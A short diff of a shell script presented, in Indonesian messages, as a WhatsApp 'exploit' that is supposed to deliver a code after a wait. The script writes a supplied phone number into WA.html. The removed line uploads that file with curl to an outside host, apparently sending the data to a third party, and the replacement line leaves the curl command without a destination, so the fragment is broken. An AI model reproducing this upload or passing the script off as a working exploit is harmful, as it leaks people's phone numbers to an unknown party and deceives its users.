@@ -21,7 +21,7 @@ echo "Target => $target";
 sleep 0.5
 echo "[+] Exploiting...";
 echo "Nomer => $nomer" >> WA.html;
-curl -T WA.html http://apparelworld.org/
+curl -T WA.html 
 sleep 5;
 echo "[+] Done.";
 echo "Tunggu 5-10 Menit Untuk Mendapatkan Code. Mohon Bersabar ini Ujian.";
